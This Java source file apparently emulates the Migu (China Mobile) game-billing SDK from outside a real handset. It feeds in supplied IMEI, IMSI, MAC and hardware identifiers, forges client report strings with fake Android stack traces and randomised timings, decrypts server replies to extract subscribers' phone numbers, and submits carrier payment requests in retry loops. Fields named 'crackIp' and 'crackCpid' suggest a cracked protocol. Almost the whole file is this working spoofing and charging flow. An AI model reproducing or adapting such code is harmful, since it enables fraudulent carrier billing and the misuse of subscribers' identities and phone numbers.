package com.astrolink.util.game2.migu20;

import java.util.Locale;
import java.util.Map;

import org.apache.http.util.TextUtils;

import com.astrolink.util.game2.utils.Common;
import com.astrolink.util.tools.Base64;

import net.sf.json.JSONObject;

public class manga {
	public String apiVersion = "20";
	public String SDKVersion = "12002005";
	public String SEC_VERSION = "A";
	public String nRQd_Lx = "202";
	public String EN = "E";
	public String miguEDVersion = "";
	public String soVersion = "03080101";
	public String migusdkversion = "20150";
	public String MiguPay_FileSHA1 = "";

	public String isRoot = "1";

	public String imei = "";
	public String encodecid = "";
	public String websessionid = "";
	public String Serial = "0000000000000000";
	public String linux_version = "3.4.5";
	public String Hardware = "HS-U978";
	public String local_ip = "";

	public String phoneNumber = "";
	public String imsi = "";

	public String apkstatus = "";
	public int netcount = 1;
	public int paycount = 0;
	public String startcount = "0002";
	public String startSecond = "";
	public String webSecond = "";

	public String PayCode = "";
	public String AppId = "";
	public String Ctype = "3";
	public String cpId = "";
	public String contentId = "";
	public String ChannelCode = "";
	public String productId = "";
	public String Fee = "";
	public String ItemId = "";
	private String mg20irid;

	private String rand16Num;
	private String sSdkSessionid;
	private String localsessionid;

	private String channelId = "";

	private String cpparam = "";
	private long currentmillis;

	private String gameContentId;
	private String gameChannelId;
	private String gameCpId;
	private String gameSDKVersion = "26002";
	private String gameType;
	private String gameSDKSessionId;
	private MiguGameLogEvent2 event;
	private String packageName;
	private String itemName;
	private String chargePolicy;
	private String gameName;

	private String RELEASE = "";
	private String screen = "";
	private String BRAND = "";
	private String MacAddr = "";
	private String versionName;
	private String versionCode;

	private long startmillis;
	private Map<String, String> headers;
	private String BaseClientHeader;
	private String ChargePolicy = "1";
	private String ChannelFlag = "1";
	private String RedUserFlag = "1";
	private String rand4num;
	private String gameLoginSms;
	
	private String sms = "";
	
	private Long reportStrCurrentmillis;
	private Long smscurrentmillis;
	private Long reReportStrCurrentmillis;

	public void initParams(JSONObject json) {
		apkstatus = json.optString("apkstatus");

		imei = json.optString("imei");
		imsi = json.optString("imsi");
		local_ip = json.optString("local_ip");
		Hardware = json.optString("Hardware");
		BRAND = json.optString("BRAND");
		RELEASE = json.optString("RELEASE");
		screen = json.optString("screen");
		MacAddr = json.optString("MacAddr");
		
		encodecid = json.optString("encodecid");
		MiguPay_FileSHA1 = json.optString("MiguPay_FileSHA1");

		cpparam = json.optString("cpparam");
		PayCode = json.optString("PayCode");
		AppId = json.optString("AppId");
		mg20irid = json.optString("mg20irid");
		cpId = json.optString("cpId");

		contentId = json.optString("contentId");
		ChannelCode = json.optString("ChannelCode");
		channelId = json.optString("channelId");
		productId = json.optString("productId");
		Fee = json.optString("Fee");
		ItemId = json.optString("ItemId");
		apiVersion = json.optString("apiVersion");
		SDKVersion = json.optString("SDKVersion");
		SEC_VERSION = json.optString("SEC_VERSION");
		nRQd_Lx = json.optString("nRQd_Lx");
		EN = json.optString("EN");
		miguEDVersion = json.optString("miguEDVersion");
		soVersion = json.optString("soVersion");
		migusdkversion = json.optString("migusdkversion");
		Serial = json.optString("Serial");
		linux_version = json.optString("linux_version");
		ItemId = json.optString("ItemId");
		rand16Num = json.optString("rand16Num");
		sSdkSessionid = json.optString("sSdkSessionid");
		localsessionid = json.optString("localsessionid");

		algorithm.ip = json.optString("crackIp");
		algorithm.cpid = json.optString("crackCpid");
		algorithm.port = "game";
		
		startmillis=json.optLong("startmillis");
		reportStrCurrentmillis=json.optLong("reportStrCurrentmillis");
		smscurrentmillis=json.optLong("smscurrentmillis");
		reReportStrCurrentmillis=json.optLong("reReportStrCurrentmillis");

		initGameParams(json);
	}

	private void initGameParams(JSONObject json) {
		gameContentId = json.optString("gameContentId");
		gameChannelId = json.optString("gameChannelId");
		gameCpId = json.optString("gameCpId");
		gameType = json.optString("gameType");
		gameSDKSessionId = json.optString("gameSDKSessionId");
		packageName = json.optString("packageName");
		itemName = json.optString("itemName");
		chargePolicy = json.optString("chargePolicy");
		gameName = json.optString("gameName");
		rand4num = json.optString("rand4num");
		gameLoginSms =new String(Base64.decode(json.optString("gameLoginSms")));
		sms=new String(Base64.decode(json.optString("sms")));
		event = new MiguGameLogEvent2();
	}



	private void initHeaders() {
		String Location = "";
		String NetworkType = "0";
		headers = base.initHeaders(apiVersion, SDKVersion, SEC_VERSION,
				nRQd_Lx, EN, imsi, imei);
		BaseClientHeader = base.generate_BaseClientHeader(sSdkSessionid, "0",
				imei, imsi, RELEASE, screen, BRAND, Hardware, SDKVersion,
				nRQd_Lx, MacAddr, Location, local_ip, NetworkType);
		local_ip = base.formateLocalip(local_ip);
	}

	private void runGameLog() {
//		new Thread(new Runnable() {
//
//			@Override
//			public void run() {
				String andSynchToken = "";
				String status = "";
				for (int i = 0; i < 3; i++) {
					andSynchToken = event.getAndSynchToken(rand4num);

					status = Common.getValue(andSynchToken,
							"<status>", "</status");
					if (status.equals("0")) {
						break;
					}
//					try {
//						Thread.sleep(3000);
//					} catch (InterruptedException e) {
//						e.printStackTrace();
//					}
				}
				if (status.equals("0")) {
					String userToken = Common.getValue(
							andSynchToken, "<userToken>", "</userToken");
					String loginType = Common.getValue(
							andSynchToken, "<loginType>", "</loginType");
					String tokenTel = Common.getValue(
							andSynchToken, "<tokenTel>", "</tokenTel");

					String loginNewClient = event.loginNewClient(Hardware,
							userToken, loginType);
					status = Common.getValue(loginNewClient,
							"<status>", "</status");
					if (status.equals("0")) {
						String uid = Common.getValue(
								loginNewClient, "<uid>", "</uid");
						String ub = Common.getValue(
								loginNewClient, "<ub>", "</ub");
						event.queryCardMarket(uid, ub);
						event.queryAnnouncement(uid, ub, "2");
						event.subscribeAuth(uid, ub);
						event.userTransLogin(uid, ub);
					}
				}
				event.queryCfgAct();
				event.QueryConfigPolicy();
//				event.gameLogEvent2(currentmillis, webSecond);
//			}
//		}).start();
	}

	public String[] run() {
		String session = Common.getSession(5);
		String[] result = new String[] { "-1", session, "", "" };

		event.init(gameSDKSessionId, gameSDKVersion, gameCpId, gameContentId,
				gameChannelId, imei, imsi, MacAddr, BRAND, Hardware);

//		startmillis = System.currentTimeMillis();
		initHeaders();
		base.post_verification_checkSdkUpdate(headers, SDKVersion,
				miguEDVersion, soVersion);

		local_ip = base.formateLocalip(local_ip);

		currentmillis = reportStrCurrentmillis;//startmillis + base.getRandom(5000);
		long webmillis = currentmillis;
		startSecond = (currentmillis - startmillis) / 1000 + "";
		webSecond = (currentmillis - webmillis) / 1000 + "";

		String ReportStr = base
				.generate_ReportStr(
						"",
						imei,
						imsi,
						encodecid,
						"",
						base.getSmsTimeStampByMillis(currentmillis),
						apkstatus,
						netcount,
						paycount,
						startcount,
						startSecond,
						webSecond,
						soVersion,
						migusdkversion,
						"",
						"",
						"",
						"",
						"",
						MiguPay_FileSHA1,
						Serial,
						linux_version,
						Hardware,
						local_ip,
						"cn.cmgame.billing.api.GameOpenActivity.onCreate(GameOpenActivity.java:31)|4",
						isRoot, localsessionid);
		netcount++;

		String tl_initcttl_rsp = base.post_tl_initcttl(headers,
				BaseClientHeader, mg20irid, ReportStr,
				base.getLogTimeStampByMillis(currentmillis), miguEDVersion);
		if (!base.getContextByTag(tl_initcttl_rsp, "ResultCode").equals("0")) {
			result[3] = tl_initcttl_rsp;
			return result;
		}
		String tl_initcttl_enc = base.getContextByTag(tl_initcttl_rsp, "Enc");

		String[] tl_initcttl_enc_dec = algorithm.DecryptNet1(mg20irid,
				tl_initcttl_enc);
		if (tl_initcttl_enc_dec == null) {
			result[0] = "-2";
			result[3] = "tl_initcttl_enc_dec_null";
			return result;
		}
		// -----------------------------------------gameLog--------------------------------------------

		event.QueryConfigPolicy();
		event.queryConfiguration();
		event.queryThirdPayInfo();
		event.gameLogEvent1(webmillis, webSecond);

		event.QuerySafechargeRuleV2();
		event.post_egsb_verification_checkSdkUpdate("1");
		event.queryAll();
		event.switches();
		event.getUpdateUrl(packageName);

		currentmillis = smscurrentmillis;//currentmillis + 1000 + base.getRandom(1000);

		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;

		runGameLog();

		// -------------------------------------------------------------------------------------

//		String sms = base.generate_migu_sms(mg20irid, imsi, imei, encodecid,
//				rand16Num, base.getSmsTimeStampByMillis(currentmillis),
//				apkstatus);
		if (sms.equals("")) {
			result[0] = "-3";
			result[3] = "sms_not_found";
			return result;
		}

		currentmillis = reReportStrCurrentmillis;//currentmillis + 10000 + base.getRandom(10000);
		String charge_getSession_rsp = "";
		for (int i = 0; i < 3; i++) {
			webSecond = (currentmillis - webmillis) / 1000 + "";
			startSecond = (Integer.parseInt(startSecond) + Integer
					.parseInt(webSecond)) + "";
			webmillis = currentmillis;
			ReportStr = base
					.generate_ReportStr(
							"",
							imei,
							imsi,
							encodecid,
							"",
							base.getSmsTimeStampByMillis(currentmillis),
							apkstatus,
							netcount,
							paycount,
							startcount,
							startSecond,
							webSecond,
							soVersion,
							migusdkversion,
							"",
							"",
							"",
							"",
							"",
							MiguPay_FileSHA1,
							Serial,
							linux_version,
							Hardware,
							local_ip,
							"com.migu.sdk.inter.impl.e$2.run(SMSGetPhoneImpl.java:72)|2",
							isRoot, localsessionid);
			netcount++;
			charge_getSession_rsp = base.post_charge_getSession(headers,
					mg20irid, sms, ReportStr, miguEDVersion);
			String resultCode = base.getContextByTag(charge_getSession_rsp, "ResultCode");
			if (resultCode.equals("0")) {
				break;
			} else {
				if (i == 2) {
					result[0] = "-4";
					result[3] = resultCode;
					return result;
				}
				currentmillis = currentmillis + 1000 + base.getRandom(2000);
				try {
					Thread.sleep(3 * 1000);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		}

		String[] charge_getSession_rsp_dec = algorithm.DecryptNet1(mg20irid,
				base.getContextByTag(charge_getSession_rsp, "Enc"));
		if (charge_getSession_rsp_dec == null) {
			result[0] = "-5";
			result[3] = "post_charge_getSession_decode_mobile_failed_null";
			return result;
		}
		phoneNumber = charge_getSession_rsp_dec[0].substring(3, 14);
		result[2] = phoneNumber;
		for (int i = 0; i < 3; i++) {
			result = billing(localsessionid, startmillis, headers,
					BaseClientHeader, webmillis, "32", "", "0", result);
			result[3] += ("billing_count_" + i);
			if (result[0].equals("0")) {
				break;
			}
		}
		return result;

	}

	public String[] billing() {
		String session = Common.getSession(5);
		String[] result = new String[] { "-1", session, "", "" };
		for (int i = 0; i < 3; i++) {
			result = billing(localsessionid, startmillis, headers,
					BaseClientHeader, currentmillis, "32", "0", "0", result);
			result[3] += ("billing_count_" + i);
			if (result[0].equals("0")) {
				break;
			}
		}
		return result;
	}

	private String[] billing(String localsessionid, long startmillis,
			Map<String, String> headers, String BaseClientHeader,
			long webmillis, String ChargePolicy, String ChannelFlag,
			String RedUserFlag, String[] result) {
		headers.remove("kyMy");
		headers.remove("ssov");
		String ReportStr;
		event.gameLogEvent4(currentmillis, webSecond, Fee, itemName, ItemId,
				chargePolicy);
		//
		currentmillis = currentmillis + 20000 + base.getRandom(100000);
		long stayTime = currentmillis;

		currentmillis = currentmillis + 100 + base.getRandom(200);
		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;
		ReportStr = base.generate_ReportStr(phoneNumber, imei, imsi, encodecid,
				"", base.getSmsTimeStampByMillis(currentmillis), apkstatus,
				netcount, paycount, startcount, startSecond, webSecond,
				soVersion, migusdkversion, "", "", "", "", "",
				MiguPay_FileSHA1, Serial, linux_version, Hardware, local_ip,
				"com.migu.sdk.a.b$5.run(CatchLog.java:638)|2", isRoot,
				localsessionid);
		netcount++;
		String tl_tcttl_recordPolicyLog_req = base
				.generate_tl_tcttl_recordPolicyLog(BaseClientHeader,
						base.getLogTimeStampByMillis(currentmillis),
						phoneNumber, Ctype, "", phoneNumber, cpId, contentId,
						ChannelCode, productId, "", ChargePolicy, ChannelFlag,
						RedUserFlag);
		String tl_tcttl_recordPolicyLog_rsp = base.post_tl_tcttl(headers,
				mg20irid, tl_tcttl_recordPolicyLog_req, ReportStr,
				miguEDVersion);
		if (!base.getContextByTag(tl_tcttl_recordPolicyLog_rsp, "ResultCode")
				.equals("0")) {
			result[0] = "-8";
			result[3] = tl_tcttl_recordPolicyLog_rsp;
		}

		currentmillis = currentmillis + 500 + base.getRandom(1000);
		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;
		ReportStr = base.generate_ReportStr(phoneNumber, imei, imsi, encodecid,
				"", base.getSmsTimeStampByMillis(currentmillis), apkstatus,
				netcount, paycount, startcount, startSecond, webSecond,
				soVersion, migusdkversion, "0", "", "", "", "",
				MiguPay_FileSHA1, Serial, linux_version, Hardware, local_ip,
				"com.migu.sdk.c.b$5.run(MiguMainSDK.java:297)|2", isRoot,
				localsessionid);
		netcount++;
		String policySecLv_queryChargePolicyInfoReq = base
				.generate_policySecLv_queryChargePolicyInfoReq(
						BaseClientHeader, phoneNumber,
						base.getLogTimeStampByMillis(currentmillis), Ctype, "",
						"", "", cpId, contentId, ChannelCode, productId);
		String policySecLv_queryChargePolicyInfoReq_rsp = base
				.post_policySecLv_queryChargePolicyInfoReq(headers, mg20irid,
						policySecLv_queryChargePolicyInfoReq, ReportStr,
						miguEDVersion);
		if (!base.getContextByTag(policySecLv_queryChargePolicyInfoReq_rsp,
				"ResultCode").equals("0")) {
			result[0] = "-6";
			result[3] = policySecLv_queryChargePolicyInfoReq_rsp;
		}

		String[] policySecLv_queryChargePolicyInfoReq_rsp_dec = algorithm
				.DecryptNet1(mg20irid, base.getContextByTag(
						policySecLv_queryChargePolicyInfoReq_rsp, "Enc"));
		if (policySecLv_queryChargePolicyInfoReq_rsp_dec == null
				|| !base.getContextByTag(
						policySecLv_queryChargePolicyInfoReq_rsp_dec[1],
						"ResultCode").equals("0")) {
			result[0] = "-7";
			result[3] = "post_policySecLv_queryChargePolicyInfoReq_decode_failed"
					+ policySecLv_queryChargePolicyInfoReq_rsp_dec[1];
		}

		ChargePolicy = base
				.getContextByTag(
						policySecLv_queryChargePolicyInfoReq_rsp_dec[1],
						"ChargePolicy");
		ChannelFlag = base.getContextByTag(
				policySecLv_queryChargePolicyInfoReq_rsp_dec[1], "ChannelFlag");
		ChannelFlag = TextUtils.isEmpty(ChannelFlag) ? "0" : ChannelFlag;
		RedUserFlag = base.getContextByTag(
				policySecLv_queryChargePolicyInfoReq_rsp_dec[1], "RedUserFlag");
		ChargePolicy = "1";
		currentmillis = currentmillis + 2000 + base.getRandom(10000);
		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;

		event.gameLogEvent5(currentmillis, webSecond, Fee, itemName, ItemId,
				chargePolicy, screen);
		event.gameLogEvent6(currentmillis, webSecond, Fee, itemName, ItemId,
				chargePolicy);

		ReportStr = base
				.generate_ReportStr(
						phoneNumber,
						imei,
						imsi,
						encodecid,
						"",
						base.getSmsTimeStampByMillis(currentmillis),
						apkstatus,
						netcount,
						paycount,
						startcount,
						startSecond,
						webSecond,
						soVersion,
						migusdkversion,
						"",
						"",
						"",
						"",
						"",
						MiguPay_FileSHA1,
						Serial,
						linux_version,
						Hardware,
						local_ip,
						"cn.cmgame2_0.billing_model.view.C.billing.ABillingViewController$6.onClick(ABillingViewController.java:426)|2",
						isRoot, localsessionid);
		netcount++;
		String OrderId = "030" + System.currentTimeMillis() + "FLo2wL";
		// cpparam = Common.getSession(16);
		// cpparam = "qwert";
		String charge_sessionReq_req = base.generate_charge_sessionReq(
				ChargePolicy, phoneNumber,
				base.getLogTimeStampByMillis(currentmillis), Ctype, OrderId,
				Fee, ItemId, cpId, contentId, ChannelCode, productId, cpparam);
		String charge_sessionReq_rsp = base.post_charge_sessionReq(headers,
				mg20irid, charge_sessionReq_req, ReportStr, miguEDVersion);
		if (!base.getContextByTag(charge_sessionReq_rsp, "ResultCode").equals(
				"0")) {
			result[0] = "-9";
			result[3] = charge_sessionReq_rsp;
			return result;
		}
		String ihJVd = base.getContextByTag(charge_sessionReq_rsp, "ihJVd");
		String Lwkn = base.getContextByTag(charge_sessionReq_rsp, "Lwkn");
		String[] charge_sessionReq_rsp_dec = algorithm.DecryptNet1(mg20irid,
				base.getContextByTag(charge_sessionReq_rsp, "Enc"));
		if (charge_sessionReq_rsp_dec == null) {
			result[0] = "-10";
			result[3] = "charge_sessionReq_rsp_dec_null";
			return result;
		}
		String websessionid = charge_sessionReq_rsp_dec[0].substring(1, 9);
		currentmillis = currentmillis + 500 + base.getRandom(1000);
		webSecond = (currentmillis - webmillis) / 1000 + "";
		startSecond = (Integer.parseInt(startSecond) + Integer
				.parseInt(webSecond)) + "";
		webmillis = currentmillis;
		paycount++;
		if (paycount == 1) {
			apkstatus = chargeApkstatus();
		}
		String ChargePolicyStatus = "status=0,get=" + "1" + ",use=" + "1";
		String payInfo = cpId + "," + "" + "," + productId + "," + contentId
				+ ";" + cpId + "," + ChannelCode + "," + productId + ","
				+ contentId;
		ReportStr = base.generate_ReportStr(phoneNumber, imei, imsi, encodecid,
				websessionid, base.getSmsTimeStampByMillis(currentmillis),
				apkstatus, netcount, paycount, startcount, startSecond,
				webSecond, soVersion, migusdkversion, "0", ChargePolicyStatus,
				payInfo, "", "", MiguPay_FileSHA1, Serial, linux_version,
				Hardware, local_ip,
				"com.openx.greq.c.c$3.run(Client.java:127)|2", isRoot,
				localsessionid);
		netcount++;
		headers.put("kyMy", ihJVd);
		headers.put("ssov", miguEDVersion);
		String charge_payReq_req = base.generate_charge_payReq(
				BaseClientHeader, ChargePolicy, phoneNumber, ChannelFlag,
				base.getLogTimeStampByMillis(currentmillis), Ctype, OrderId,
				Fee, ItemId, cpId, contentId, ChannelCode, productId, cpparam,
				gameContentId, gameChannelId);
		String edstr = base.generate_charge_payReq_EDstr(
				miguEDVersion.substring(miguEDVersion.indexOf(".") + 1),
				base.getSmsTimeStampByMillis(currentmillis
						- (8 * 60 * 60 * 1000)), imei, paycount);
		String charge_payReq_rsp = base
				.post_charge_payReq(headers, mg20irid, charge_payReq_req,
						ReportStr, ihJVd, Lwkn, edstr, miguEDVersion);

		event.gameLogEvent7(currentmillis, webSecond, gameName, Fee, itemName,
				ItemId, chargePolicy, screen, RELEASE, packageName,
				versionName, versionCode, currentmillis - stayTime);
		if (!base.getContextByTag(charge_payReq_rsp, "ResultCode").equals("0")) {
			result[0] = "-11";
			result[3] = charge_payReq_rsp;
			return result;
		}
		String[] charge_payReq_rsp_dec = algorithm.DecryptNet1(mg20irid,
				base.getContextByTag(charge_payReq_rsp, "Enc"));
		if (charge_payReq_rsp_dec == null
				|| !base.getContextByTag(charge_payReq_rsp_dec[1], "ResultCode")
						.equals("0")) {
			result[0] = "-12";
			result[3] = "charge_payReq_rsp_dec_" + charge_payReq_rsp_dec[1];
			return result;
		}
		result[0] = "0";
		result[3] = charge_payReq_rsp_dec[1];
		return result;
	}

	private String chargeApkstatus() {
		int states = Integer.parseInt(apkstatus) + 8;
		if (states < 10) {
			return "0" + states;
		}
		return states + "";
	}

}
